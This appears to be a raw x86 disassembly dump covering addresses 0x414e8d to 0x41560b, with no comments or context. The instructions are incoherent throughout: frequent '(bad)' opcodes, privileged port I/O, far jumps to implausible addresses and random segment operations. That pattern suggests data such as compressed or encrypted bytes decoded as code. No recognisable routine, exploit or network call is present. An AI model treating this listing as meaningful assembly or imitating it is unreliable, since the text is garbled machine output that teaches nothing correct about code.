  414e8d:	je     0x414ea5
  414e8f:	ss cmp eax,0x98e84125
  414e95:	out    0x1,eax
  414e97:	xor    eax,0x66043d5d
  414e9c:	gs ins DWORD PTR es:[edi],dx
  414e9e:	sub    dl,BYTE PTR [ebp-0x11]
  414ea1:	jmp    0xdbd7ad6c
  414ea6:	in     eax,0xd4
  414ea8:	shr    DWORD PTR ds:0xadbf79c5,0xb5
  414eaf:	pushf  
  414eb0:	jmp    0x826:0xdee10c9f
  414eb7:	loope  0x414f03
  414eb9:	xchg   ch,bh
  414ebb:	aaa    
  414ebc:	fisub  DWORD PTR [esi+ebp*8]
  414ebf:	jmp    FWORD PTR [ecx]
  414ec1:	push   ebp
  414ec2:	xchg   DWORD PTR [esi-0x79],edi
  414ec5:	sub    esi,DWORD PTR [edi]
  414ec7:	push   eax
  414ec8:	sbb    ebx,esp
  414eca:	sahf   
  414ecb:	mov    DWORD PTR [edx+0x7324d4e7],ebp
  414ed1:	inc    edi
  414ed2:	leave  
  414ed3:	mov    ecx,0x5b5acb29
  414ed8:	jle    0x414efa
  414eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414edb:	cmc    
  414edc:	sbb    esp,esi
  414ede:	mov    esi,0x5ad6541e
  414ee3:	test   esi,0xf0bbb03c
  414ee9:	dec    edi
  414eea:	xchg   esi,eax
  414eeb:	imul   ecx,DWORD PTR [eax+0x42],0x60
  414eef:	pusha  
  414ef0:	leave  
  414ef1:	xlat   BYTE PTR ds:[ebx]
  414ef2:	jge    0x414f43
  414ef4:	dec    ebp
  414ef5:	mov    al,0x43
  414ef7:	(bad)  [ecx]
  414ef9:	pop    ebp
  414efa:	in     al,dx
  414efb:	inc    ecx
  414efc:	test   DWORD PTR [edx],0x18335a6
  414f02:	pop    edi
  414f03:	xchg   esp,eax
  414f04:	and    eax,0x77ef9950
  414f09:	ss inc ecx
  414f0b:	mov    ebp,esi
  414f0d:	inc    eax
  414f0e:	xor    DWORD PTR [ecx],ebp
  414f10:	xor    DWORD PTR [ecx+0x3eba5a9e],ebx
  414f16:	mov    ds:0x29c64fee,eax
  414f1b:	jle    0x414eec
  414f1d:	mov    ds:0xa3a35693,al
  414f22:	(bad)  
  414f23:	jb     0x414ee9
  414f25:	daa    
  414f26:	mov    ds:0x1171a066,eax
  414f2b:	xchg   BYTE PTR [edx-0x6b],dh
  414f2e:	add    al,0xda
  414f30:	fisttp DWORD PTR [esi-0x49]
  414f33:	sub    ch,dl
  414f35:	shr    DWORD PTR [ebp+0x50],cl
  414f38:	gs neg ecx
  414f3b:	and    eax,0x1b8c1ea3
  414f40:	or     dl,dl
  414f42:	dec    ebx
  414f43:	ja     0x414faa
  414f45:	xor    al,0xd8
  414f47:	inc    ebp
  414f48:	(bad)  
  414f49:	cmc    
  414f4a:	pop    esi
  414f4b:	std    
  414f4c:	scas   eax,DWORD PTR es:[edi]
  414f4d:	scas   eax,DWORD PTR es:[edi]
  414f4e:	or     BYTE PTR [edx-0x1bf4bbad],bh
  414f54:	test   al,0x86
  414f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f57:	dec    esi
  414f58:	rcr    DWORD PTR [ecx+0x4fedb6],1
  414f5e:	xchg   DWORD PTR [edi],ebx
  414f60:	sbb    DWORD PTR [edx+eiz*1-0x7b],edx
  414f64:	cmp    DWORD PTR [edx+0x2c8926f5],0xfffffff9
  414f6b:	repz jne 0x414f3b
  414f6e:	push   edx
  414f6f:	fadd   st(3),st
  414f71:	or     eax,0xfce0da14
  414f76:	bound  esi,QWORD PTR [ebx-0x38]
  414f79:	outs   dx,BYTE PTR ds:[esi]
  414f7a:	adc    BYTE PTR [eax-0x4e6e3eb5],bl
  414f80:	nop
  414f81:	jbe    0x414faf
  414f83:	push   ebx
  414f84:	out    0xd7,eax
  414f86:	scas   al,BYTE PTR es:[edi]
  414f87:	xchg   ecx,eax
  414f88:	cmp    dh,0x84
  414f8b:	fbld   TBYTE PTR ds:0xc9ad9c70
  414f91:	push   ecx
  414f92:	push   0x354fddc2
  414f97:	push   0xffffffce
  414f99:	mov    al,bh
  414f9b:	test   eax,0xdf947d27
  414fa0:	inc    eax
  414fa1:	inc    esp
  414fa2:	fs in  al,0xc2
  414fa5:	inc    BYTE PTR [esi+0x73]
  414fa8:	sbb    BYTE PTR [edx-0x4],al
  414fab:	sbb    al,0x0
  414fad:	out    0x36,al
  414faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fb0:	in     al,dx
  414fb1:	pop    edi
  414fb2:	call   0x9fc302e2
  414fb7:	imul   esp,ebp,0xffffffcc
  414fba:	sub    al,0xad
  414fbc:	dec    ebp
  414fbd:	sti    
  414fbe:	fwait
  414fbf:	iret   
  414fc0:	int    0x41
  414fc2:	push   ebp
  414fc3:	or     BYTE PTR [ecx],al
  414fc5:	dec    ebp
  414fc6:	in     al,dx
  414fc7:	xchg   ebp,eax
  414fc8:	inc    edi
  414fc9:	dec    esp
  414fca:	lds    ebp,FWORD PTR [ecx+0x50afa5b3]
  414fd0:	mov    bl,0xba
  414fd2:	nop
  414fd3:	dec    esi
  414fd4:	or     WORD PTR [edi],0x81c2
  414fd9:	inc    edx
  414fda:	push   esi
  414fdb:	(bad)  
  414fdc:	sbb    BYTE PTR [esp+ebp*1-0x880b8ba],al
  414fe3:	sub    edx,DWORD PTR [edi]
  414fe5:	iret   
  414fe6:	jbe    0x414fe4
  414fe8:	jns    0x41503b
  414fea:	jp     0x414fa1
  414fec:	adc    ah,BYTE PTR [edx-0x24]
  414fef:	sub    al,0x65
  414ff1:	ins    DWORD PTR es:[edi],dx
  414ff2:	mov    DWORD PTR [ebx-0x7b],ebp
  414ff5:	scas   eax,DWORD PTR es:[edi]
  414ff6:	or     al,0x9a
  414ff8:	gs std 
  414ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ffb:	shr    BYTE PTR [ebp+0x69],1
  414ffe:	out    0xcc,eax
  415000:	rcl    ch,1
  415002:	arpl   WORD PTR [esi+eiz*1-0x78dc83e5],cx
  415009:	mov    eax,ds:0x986a2121
  41500e:	std    
  41500f:	dec    eax
  415010:	jmp    0xc6966cf1
  415015:	inc    DWORD PTR [ebp+0x66]
  415018:	test   esi,esp
  41501a:	scas   al,BYTE PTR es:[edi]
  41501b:	xchg   edx,eax
  41501c:	scas   al,BYTE PTR es:[edi]
  41501d:	ins    BYTE PTR es:[edi],dx
  41501e:	daa    
  41501f:	dec    ebx
  415020:	mov    dl,BYTE PTR [ecx+0x3ef8bec6]
  415026:	shl    BYTE PTR [edx+0x2],1
  415029:	loope  0x414fbd
  41502b:	mov    ds:0x1c72cc66,al
  415030:	pop    ds
  415031:	imul   edi,DWORD PTR [edi-0x42],0xffffff81
  415035:	mov    dh,0x79
  415037:	ja     0x415032
  415039:	ret    0xbeef
  41503c:	add    BYTE PTR [edi],0x7c
  41503f:	and    ebp,esi
  415041:	pushf  
  415042:	stos   DWORD PTR es:[edi],eax
  415043:	add    esi,ebx
  415045:	sub    eax,0x9d7a22c
  41504a:	jns    0x41504c
  41504c:	mov    edx,0x86cb06e
  415051:	adc    eax,0xa5dcf013
  415056:	(bad)  
  415057:	xchg   edi,eax
  415058:	sti    
  415059:	std    
  41505a:	rol    DWORD PTR [esi+0x5],0xae
  41505e:	xor    al,0x37
  415060:	dec    ebp
  415061:	jecxz  0x41502c
  415063:	shl    DWORD PTR [edx+ebp*4],cl
  415066:	jle    0x414ff4
  415068:	je     0x4150e1
  41506a:	outs   dx,DWORD PTR ds:[esi]
  41506b:	sbb    edi,DWORD PTR [esi-0x2a]
  41506e:	inc    ebp
  41506f:	pusha  
  415070:	sbb    al,0xd4
  415072:	dec    esp
  415073:	cdq    
  415074:	dec    eax
  415075:	xchg   esp,eax
  415076:	push   esi
  415077:	xchg   esi,eax
  415078:	shl    BYTE PTR [ebp-0x6ac6b6e1],0x9b
  41507f:	imul   eax,eax,0xfffffff1
  415082:	xchg   DWORD PTR [edx+ebx*4],eax
  415085:	clc    
  415086:	sbb    BYTE PTR [edx*2-0x25baf8dd],bh
  41508d:	enter  0x15f3,0x66
  415091:	mov    cl,0x38
  415093:	xor    al,0x5e
  415095:	clc    
  415096:	lods   al,BYTE PTR ds:[esi]
  415097:	pop    edi
  415098:	add    eax,0xc2d3115f
  41509d:	repnz adc dl,bl
  4150a0:	lods   eax,DWORD PTR ds:[esi]
  4150a1:	jns    0x415113
  4150a3:	jg     0x415074
  4150a5:	fld    st(4)
  4150a7:	int3   
  4150a8:	cmp    BYTE PTR [eax],bh
  4150aa:	fs in  eax,dx
  4150ac:	imul   esp,DWORD PTR [eax-0x7d4dca9b],0x9
  4150b3:	out    0x55,eax
  4150b5:	pop    ds
  4150b6:	xchg   ecx,eax
  4150b7:	lock out 0x2e,eax
  4150ba:	xchg   edx,eax
  4150bb:	ins    DWORD PTR es:[edi],dx
  4150bc:	and    ecx,DWORD PTR [ebx-0x7d42f445]
  4150c2:	dec    eax
  4150c3:	dec    edi
  4150c4:	cmc    
  4150c5:	inc    ecx
  4150c6:	hlt    
  4150c7:	sbb    BYTE PTR [ebx],al
  4150c9:	adc    esp,DWORD PTR [eax-0x74a671eb]
  4150cf:	and    al,0x16
  4150d1:	xchg   esi,eax
  4150d2:	cmp    BYTE PTR [eax-0x4b],al
  4150d5:	(bad)  
  4150d6:	cmc    
  4150d7:	icebp  
  4150d8:	clc    
  4150d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150da:	mov    BYTE PTR [eax+0x6e],dl
  4150dd:	ss into 
  4150df:	repnz push 0x5cbcb506
  4150e5:	inc    BYTE PTR [edx+esi*8-0x614bc426]
  4150ec:	pop    ds
  4150ed:	fcom   DWORD PTR [edx]
  4150ef:	test   esp,esp
  4150f1:	push   es
  4150f2:	push   edi
  4150f3:	mov    eax,ds:0xa974fdcb
  4150f8:	add    DWORD PTR [ecx+0x13eae70c],edx
  4150fe:	xor    cl,BYTE PTR [ebx-0x52]
  415101:	inc    ebp
  415102:	mov    cl,0xa2
  415104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415105:	pop    es
  415106:	cmovae esp,DWORD PTR [esi]
  415109:	popa   
  41510a:	adc    ebx,edi
  41510c:	loope  0x415120
  41510e:	cwde   
  41510f:	mov    gs,eax
  415111:	push   cs
  415112:	jbe    0x4150a3
  415114:	add    al,0xd9
  415116:	loop   0x4150ea
  415118:	inc    esp
  415119:	cmp    eax,0xfdb26c67
  41511e:	add    al,0xea
  415120:	jle    0x4150ff
  415122:	ret    0xef76
  415125:	push   0xfffffff1
  415127:	sbb    eax,DWORD PTR [ebp+0x7b]
  41512a:	push   ebx
  41512b:	or     dl,BYTE PTR [esi+0x4c884691]
  415131:	(bad)  
  415133:	ret    0x290
  415136:	or     al,0x7b
  415138:	and    DWORD PTR [edx+0x4569326d],esi
  41513e:	jno    0x415170
  415140:	inc    edi
  415141:	push   0x8e180467
  415146:	int    0x1a
  415148:	sbb    DWORD PTR [esi+0x2a6f2cc7],esp
  41514e:	inc    esp
  41514f:	jl     0x415103
  415151:	and    al,bh
  415153:	ds mov ch,0x5c
  415156:	xchg   ebp,eax
  415157:	ret    0x1135
  41515a:	cmc    
  41515b:	cmp    DWORD PTR [esi],ebx
  41515d:	dec    edx
  41515e:	dec    edi
  41515f:	icebp  
  415160:	imul   esi,DWORD PTR [esi],0xffffffe2
  415163:	shl    BYTE PTR [ebx+ebx*4-0x4eb04919],cl
  41516a:	aas    
  41516b:	mov    esp,0x38583a0e
  415170:	adc    al,0x71
  415172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415173:	jge    0x4151ae
  415175:	lock cs aad 0x7b
  415179:	out    0x74,al
  41517b:	xor    BYTE PTR [ebx+esi*1-0x46ab9eca],bh
  415182:	dec    esi
  415183:	jno    0x41514e
  415185:	add    eax,0xa6201ec9
  41518a:	mov    eax,0x624738e9
  41518f:	sub    bh,BYTE PTR [eax]
  415191:	repnz xchg edx,eax
  415193:	repnz xor al,0x36
  415196:	or     BYTE PTR cs:[esi-0x59],cl
  41519a:	push   edi
  41519b:	outs   dx,BYTE PTR ds:[esi]
  41519c:	push   cs
  41519d:	outs   dx,BYTE PTR ds:[esi]
  41519e:	pop    esi
  41519f:	scas   eax,DWORD PTR es:[edi]
  4151a0:	jns    0x41520e
  4151a2:	mov    al,ds:0xdae067e9
  4151a7:	jge    0x415217
  4151a9:	sbb    eax,0x17c2b63a
  4151ae:	fldenv [ebx+0x7]
  4151b1:	mov    esi,0x61b38448
  4151b6:	(bad)  
  4151b7:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4151b9:	fld    DWORD PTR [edi-0x14]
  4151bc:	fsubr  st,st(4)
  4151be:	dec    esi
  4151bf:	pop    ds
  4151c0:	lods   al,BYTE PTR ds:[esi]
  4151c1:	out    0x49,eax
  4151c3:	bound  esp,QWORD PTR [edi-0x7b]
  4151c6:	std    
  4151c7:	aad    0xf
  4151c9:	ret    0x3fc
  4151cc:	xor    al,BYTE PTR [ebp-0x4ee3a912]
  4151d2:	mov    al,ds:0xc1be8059
  4151d7:	addr16 test cl,0x4c
  4151db:	sbb    BYTE PTR ds:0xa2f2a3f3,cl
  4151e1:	test   al,0x96
  4151e3:	das    
  4151e4:	in     eax,dx
  4151e5:	mov    eax,ds:0x6429ade7
  4151ea:	pop    ds
  4151eb:	pop    eax
  4151ec:	rcl    DWORD PTR [esi-0x53e1f95b],cl
  4151f2:	sub    DWORD PTR [ebp+0x75dd24ac],edi
  4151f8:	sub    eax,0xcaeb116e
  4151fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151fe:	test   BYTE PTR [ebp-0x65],bh
  415201:	xlat   BYTE PTR ds:[ebx]
  415202:	or     al,0x41
  415204:	dec    edx
  415205:	cld    
  415206:	cmp    BYTE PTR [ebp-0x74],cl
  415209:	ja     0x4151e2
  41520b:	call   FWORD PTR [eax-0x5d]
  41520e:	(bad)  
  41520f:	int3   
  415210:	jle    0x4151f8
  415212:	into   
  415213:	pop    ebp
  415214:	mov    esp,0x1a14c1d0
  415219:	sahf   
  41521a:	lock xchg BYTE PTR [ecx],dh
  41521d:	jno    0x415249
  41521f:	mov    cl,0x43
  415221:	outs   dx,BYTE PTR ds:[esi]
  415222:	lods   eax,DWORD PTR ds:[esi]
  415223:	fcmovbe st,st(4)
  415225:	mov    BYTE PTR [esi],dl
  415227:	lods   eax,DWORD PTR ds:[esi]
  415228:	ins    BYTE PTR es:[edi],dx
  415229:	call   0x9177a6d5
  41522e:	sbb    eax,0xa8e5ecfa
  415233:	mov    ds:0xbbdfd4bd,eax
  415238:	mov    ds:0x41ae0a3f,eax
  41523d:	ret    
  41523e:	sbb    al,0x10
  415240:	int    0xd4
  415242:	aaa    
  415243:	pop    ecx
  415244:	lods   al,BYTE PTR ds:[esi]
  415245:	repnz outs dx,DWORD PTR ds:[esi]
  415247:	sub    al,0xb5
  415249:	test   eax,0xe8902e53
  41524e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41524f:	mov    ebx,0xf97287ce
  415254:	and    bl,BYTE PTR [ecx+0x4ff9afc8]
  41525a:	lock jle 0x4152cb
  41525d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41525e:	mov    DWORD PTR [ebx-0x33],0x62c327bd
  415265:	jne    0x415236
  415267:	cmp    BYTE PTR [edi+0x4e],ch
  41526a:	pop    ebp
  41526b:	sahf   
  41526c:	xchg   ecx,eax
  41526d:	pop    eax
  41526e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41526f:	pop    esp
  415270:	in     al,dx
  415271:	je     0x415218
  415273:	cmp    ecx,DWORD PTR [ebp-0x161cd076]
  415279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41527a:	push   ebx
  41527b:	mov    edi,ebx
  41527d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41527f:	mov    al,0x66
  415281:	in     eax,0xbf
  415283:	retf   0x736e
  415286:	mov    WORD PTR [edx],cs
  415288:	sbb    cl,BYTE PTR [ebx+0x22]
  41528b:	loopne 0x415264
  41528d:	mov    al,ds:0x7fe3c7dc
  415292:	add    DWORD PTR [edx+0x6d],edx
  415295:	(bad)  
  415297:	cmp    DWORD PTR [ebx-0x2e],edx
  41529a:	les    edi,FWORD PTR ds:0xae2160bf
  4152a0:	mov    ecx,?
  4152a2:	fidiv  WORD PTR [edx]
  4152a4:	nop
  4152a5:	lahf   
  4152a6:	inc    edx
  4152a7:	cmp    al,0x40
  4152a9:	stos   DWORD PTR es:[edi],eax
  4152aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ab:	mov    edi,0x1ef4b36b
  4152b0:	xor    edi,eax
  4152b2:	aas    
  4152b3:	mov    DWORD PTR [edi-0x6c],edi
  4152b6:	cs scas al,BYTE PTR es:[edi]
  4152b8:	jbe    0x415307
  4152ba:	pop    ebp
  4152bb:	or     eax,0x837fe475
  4152c0:	add    eax,0xcd23ae1e
  4152c5:	mov    eax,ds:0xb0392fdb
  4152ca:	jo     0x4152ff
  4152cc:	xchg   edx,eax
  4152cd:	or     esi,edx
  4152cf:	fcmovne st,st(2)
  4152d1:	sub    DWORD PTR [edi],0x63fb403a
  4152d7:	jbe    0x4152eb
  4152d9:	jmp    0xb63404b1
  4152de:	cmp    BYTE PTR [edx+0x70317ac5],ch
  4152e4:	jne    0x4152bf
  4152e6:	mov    ebx,edx
  4152e8:	mov    dh,0xb9
  4152ea:	adc    DWORD PTR [ecx+0x4dd72a51],0xffffffd1
  4152f1:	sti    
  4152f2:	jp     0x41530f
  4152f4:	jb     0x415327
  4152f6:	pop    ds
  4152f7:	test   eax,0x53616456
  4152fc:	punpckldq mm7,DWORD PTR ds:0x3c623d6e
  415303:	(bad)  
  415304:	sub    ebx,DWORD PTR [esi]
  415306:	jp     0x415368
  415308:	aad    0x81
  41530a:	lahf   
  41530b:	mov    ds:0x674509d7,al
  415310:	sub    esi,edi
  415312:	dec    ebp
  415313:	nop
  415314:	xchg   dh,cl
  415316:	jg     0x4152bf
  415318:	in     al,0xec
  41531a:	or     ebx,DWORD PTR [esi+0x16566db7]
  415320:	xlat   BYTE PTR ds:[ebx]
  415321:	xchg   DWORD PTR [edi],edi
  415323:	adc    BYTE PTR [eax+0x33],ch
  415326:	ss in  al,0x85
  415329:	in     al,dx
  41532a:	cs sbb al,0xd3
  41532d:	dec    esi
  41532e:	cs repz fwait
  415331:	js     0x4152c0
  415333:	popf   
  415334:	xchg   edi,eax
  415335:	out    0x8,al
  415337:	retf   0x31e1
  41533a:	xor    dh,dh
  41533c:	sbb    BYTE PTR gs:[eax],al
  41533f:	and    eax,0xd4689350
  415344:	cmp    al,0x8e
  415346:	ret    0xaea8
  415349:	sahf   
  41534a:	xchg   ebx,eax
  41534b:	push   edi
  41534c:	nop
  41534d:	std    
  41534e:	pop    ebx
  41534f:	pop    es
  415350:	jbe    0x4153cc
  415352:	xor    eax,0xdc564322
  415357:	inc    ebp
  415358:	xor    dh,BYTE PTR [ecx-0xc]
  41535b:	imul   eax,DWORD PTR [esi-0x50],0x6f
  41535f:	add    al,0xb2
  415361:	fwait
  415362:	adc    al,0x78
  415364:	jmp    0x4153a8
  415366:	fild   WORD PTR [edi+0x64a8a515]
  41536c:	add    al,0x4f
  41536e:	sub    BYTE PTR [eax],bh
  415370:	and    esi,DWORD PTR [edi+eiz*4]
  415373:	lds    eax,FWORD PTR [edi]
  415375:	sbb    edi,edx
  415377:	mov    edi,0x56a9a15b
  41537c:	xchg   edi,eax
  41537d:	(bad)  
  41537e:	mov    ch,0xc4
  415380:	jne    0x415329
  415382:	push   eax
  415383:	push   ss
  415384:	jmp    0x4153a8
  415386:	outs   dx,BYTE PTR ds:[esi]
  415387:	sbb    eax,0xf16337ad
  41538c:	mov    ch,0x9e
  41538e:	stos   DWORD PTR es:[edi],eax
  41538f:	repz sub dh,0x9
  415393:	fild   DWORD PTR [edi+0x7d]
  415396:	jge    0x415393
  415398:	ja     0x4153b6
  41539a:	rcl    DWORD PTR [edx-0x2e607585],1
  4153a0:	xchg   esi,eax
  4153a1:	fs mov ah,0x19
  4153a4:	xor    eax,0x265aa786
  4153a9:	arpl   WORD PTR [ebx+esi*4-0x6a],bx
  4153ad:	icebp  
  4153ae:	xlat   BYTE PTR ds:[ebx]
  4153af:	sbb    DWORD PTR [edx-0x4],0x8f17dfcf
  4153b6:	dec    esp
  4153b7:	dec    esp
  4153b8:	mov    eax,0xc5834c60
  4153bd:	sti    
  4153be:	frstor [ebp+0x49]
  4153c1:	or     al,0xe6
  4153c3:	or     BYTE PTR [ecx+0x2cc59e1f],0xf2
  4153ca:	mov    dl,0x82
  4153cc:	dec    ebp
  4153cd:	push   ebp
  4153ce:	inc    esp
  4153cf:	mov    ds:0x74f5d33d,eax
  4153d4:	jnp    0x4153ac
  4153d6:	dec    ecx
  4153d7:	in     eax,0x71
  4153d9:	sbb    ecx,ecx
  4153db:	mov    esi,0xc765860a
  4153e0:	iret   
  4153e1:	ds dec edi
  4153e3:	test   DWORD PTR [edx],0x3895ee3c
  4153e9:	sub    BYTE PTR [ebx-0x31160d3c],dh
  4153ef:	adc    ch,BYTE PTR [ebp+0x7ed212d6]
  4153f5:	xchg   edx,eax
  4153f6:	jp     0x415390
  4153f8:	scas   al,BYTE PTR es:[edi]
  4153f9:	push   cs
  4153fa:	dec    edi
  4153fb:	add    ebx,edi
  4153fd:	hlt    
  4153fe:	in     eax,dx
  4153ff:	add    BYTE PTR [ecx],bh
  415401:	aad    0xa1
  415403:	arpl   WORD PTR [esi],bx
  415405:	icebp  
  415406:	sar    DWORD PTR [ebx],1
  415408:	pop    ebx
  415409:	xor    DWORD PTR [ebx-0xc],ecx
  41540c:	adc    DWORD PTR [ecx-0x5ac0df84],ecx
  415412:	pushf  
  415413:	nop
  415414:	test   eax,0x301a7e5f
  415419:	jmp    0x415492
  41541b:	adc    BYTE PTR [eax+0x1755076],bl
  415421:	ror    ebp,cl
  415423:	nop
  415424:	sub    dh,dh
  415426:	jae    0x4153f3
  415428:	je     0x415491
  41542a:	dec    BYTE PTR [ebp+0x1c3e951b]
  415430:	dec    esi
  415431:	repnz pop edx
  415433:	cmp    eax,0x1dc67917
  415438:	imul   ecx,ecx,0xffffffd9
  41543b:	dec    ecx
  41543c:	add    DWORD PTR [ecx+0x793a486f],eax
  415442:	inc    edi
  415443:	in     eax,dx
  415444:	std    
  415445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415446:	sub    edi,edx
  415448:	inc    edx
  415449:	push   cs
  41544a:	shr    DWORD PTR [ecx-0x9aa53b2],cl
  415450:	in     eax,dx
  415451:	daa    
  415452:	push   edx
  415453:	leave  
  415454:	loop   0x415441
  415456:	xchg   ecx,eax
  415457:	arpl   WORD PTR [ebx+eiz*2],si
  41545a:	jae    0x4154c1
  41545c:	jne    0x415403
  41545e:	ins    DWORD PTR es:[edi],dx
  41545f:	repz sar BYTE PTR [ebp-0x5e],0x50
  415464:	mov    bh,0x53
  415466:	add    eax,0xb3245c46
  41546b:	dec    esi
  41546c:	fwait
  41546d:	pop    eax
  41546e:	mov    eax,0x6b9e464e
  415473:	xor    ecx,DWORD PTR [edx]
  415475:	repz jnp 0x4154d8
  415478:	sbb    BYTE PTR [esi+eiz*1+0x18],bl
  41547c:	mov    edi,0x7a9b50e2
  415481:	dec    esi
  415482:	fimul  DWORD PTR [eax]
  415484:	bound  ebp,QWORD PTR [ebp+0x1b8fc367]
  41548a:	inc    esp
  41548b:	mov    WORD PTR [eax-0x2eeb081f],ds
  415491:	push   ds
  415492:	xchg   DWORD PTR [ebp-0x46],esi
  415495:	fnsave [esi+eiz*1]
  415498:	pushf  
  415499:	push   esp
  41549a:	mul    ch
  41549c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41549d:	es pop es
  41549f:	push   edx
  4154a0:	mov    DWORD PTR [edi],edx
  4154a2:	addr16 jp 0x4154df
  4154a5:	and    DWORD PTR ds:[eax+0x4ab02569],0xffffffe6
  4154ad:	imul   edi,DWORD PTR [ecx],0x3b074b9b
  4154b3:	lods   al,BYTE PTR ss:[esi]
  4154b5:	cmp    cl,BYTE PTR [eax]
  4154b7:	mov    ecx,DWORD PTR [esp+eax*1-0x53ead91f]
  4154be:	cmp    DWORD PTR [ebx-0xacf2424],edx
  4154c4:	int3   
  4154c5:	or     cl,0x41
  4154c8:	jae    0x41551b
  4154ca:	das    
  4154cb:	add    ch,BYTE PTR [ecx]
  4154cd:	out    0x5d,eax
  4154cf:	std    
  4154d0:	leave  
  4154d1:	sbb    ecx,esi
  4154d3:	push   edi
  4154d4:	fsub   QWORD PTR [edx]
  4154d6:	sbb    BYTE PTR [edi+edx*8+0x67],ah
  4154da:	sub    ecx,DWORD PTR [ebx-0x21ef8897]
  4154e0:	test   bl,bl
  4154e2:	dec    edi
  4154e3:	sbb    DWORD PTR [ebx],ebp
  4154e5:	pusha  
  4154e6:	stos   DWORD PTR es:[edi],eax
  4154e7:	cmp    ch,BYTE PTR [eax]
  4154e9:	(bad)  [esi-0x6b]
  4154ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ed:	test   BYTE PTR [ecx+edx*2+0xe6a8403],0xc8
  4154f5:	out    0x5b,al
  4154f7:	dec    ecx
  4154f8:	add    al,BYTE PTR [ebx+edx*4-0x7df0bd81]
  4154ff:	push   ebp
  415500:	mov    edx,0x1824443
  415505:	fcmovbe st,st(0)
  415507:	push   eax
  415508:	sub    DWORD PTR [ecx+0x51ae198e],eax
  41550e:	inc    esi
  41550f:	bound  edx,QWORD PTR [eax]
  415511:	jnp    0x4154f2
  415513:	sbb    al,0xa4
  415515:	cwde   
  415516:	push   ss
  415517:	cli    
  415518:	cmp    bh,BYTE PTR [esi-0x16]
  41551b:	inc    eax
  41551c:	(bad)  
  41551d:	in     eax,dx
  41551e:	or     DWORD PTR [ebx-0xd2150ab],ebp
  415524:	mov    ds:0xb5f03a20,eax
  415529:	and    esp,esp
  41552b:	arpl   WORD PTR [ebx],bp
  41552d:	ret    0xc73c
  415530:	es mov al,0xec
  415533:	(bad)  
  415534:	(bad)  
  415535:	loop   0x4154cb
  415537:	mov    dl,0xb4
  415539:	aaa    
  41553a:	cmc    
  41553b:	nop    DWORD PTR [edi]
  41553e:	xor    ebx,edx
  415540:	xlat   BYTE PTR gs:[ebx]
  415542:	jmp    0x4154d5
  415544:	sub    ch,BYTE PTR [edi+0x35]
  415547:	pop    edi
  415548:	mov    BYTE PTR [edx+0x74],0xb5
  41554c:	repnz (bad) [ebx+0xc]
  415550:	add    DWORD PTR [ebp+0x314964de],esi
  415556:	push   0xb879c404
  41555b:	aaa    
  41555c:	and    BYTE PTR [esi+0x3a],al
  41555f:	std    
  415560:	mov    cl,0x92
  415562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415563:	ficomp WORD PTR [ebx]
  415565:	or     esp,DWORD PTR [ecx+0x63bb72c5]
  41556b:	add    ch,BYTE PTR [ecx+0x527a4c89]
  415571:	sbb    DWORD PTR [ebp+esi*2-0x74],eax
  415575:	adc    DWORD PTR [ebp-0x49],0xa033a9bd
  41557c:	fs ds jmp 0xb5f1:0x4fe349ea
  415585:	cmp    al,0xf4
  415587:	cmp    DWORD PTR [edi+0x2d0ec03],ebx
  41558d:	jmp    0x84cb3d5e
  415592:	xchg   ebx,eax
  415593:	loop   0x4155fa
  415595:	cmp    ah,ah
  415597:	retf   
  415598:	aam    0x9e
  41559a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41559b:	inc    ebp
  41559c:	sbb    bh,ch
  41559e:	arpl   si,sp
  4155a0:	loope  0x4155c5
  4155a2:	in     al,0x5b
  4155a4:	shl    DWORD PTR [ebx+eax*4],1
  4155a7:	sub    DWORD PTR [ecx+0x15fdab36],esi
  4155ad:	cmp    eax,0x940dbf48
  4155b2:	pop    esp
  4155b3:	cdq    
  4155b4:	xor    BYTE PTR [eax],ah
  4155b6:	push   ds
  4155b7:	jae    0x415578
  4155b9:	dec    edi
  4155ba:	(bad)  
  4155bb:	loopne 0x415571
  4155bd:	stos   BYTE PTR es:[edi],al
  4155be:	out    dx,al
  4155bf:	jp     0x4155d5
  4155c1:	hlt    
  4155c2:	(bad)  
  4155c3:	in     eax,dx
  4155c4:	gs test al,0x1c
  4155c7:	cmp    BYTE PTR [eax-0x6cf52467],0xb1
  4155ce:	scas   eax,DWORD PTR es:[edi]
  4155cf:	mov    edx,0xf82adb2d
  4155d4:	pop    esp
  4155d5:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4155d7:	mov    cl,0x5f
  4155d9:	push   ds
  4155da:	xor    dh,BYTE PTR [ecx-0x666d03bf]
  4155e0:	punpcklwd mm7,DWORD PTR [ecx+0x2d62360c]
  4155e7:	lods   al,BYTE PTR ds:[esi]
  4155e8:	mov    ds:0x7a9b3675,eax
  4155ed:	push   ds
  4155ee:	fwait
  4155ef:	out    0xfb,eax
  4155f1:	enter  0xf5c,0x57
  4155f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155f6:	fwait
  4155f7:	sbb    DWORD PTR gs:[ebx-0x22904500],esi
  4155fe:	mov    dh,0x8d
  415600:	fwait
  415601:	scas   eax,DWORD PTR es:[edi]
  415602:	jns    0x415612
  415604:	sbb    dl,bl
  415606:	out    0x9a,al
  415608:	scas   eax,DWORD PTR es:[edi]
  415609:	lods   al,BYTE PTR ds:[esi]
  41560a:	cld    
  41560b:	xor    DWORD PTR [esi+0x4],esi
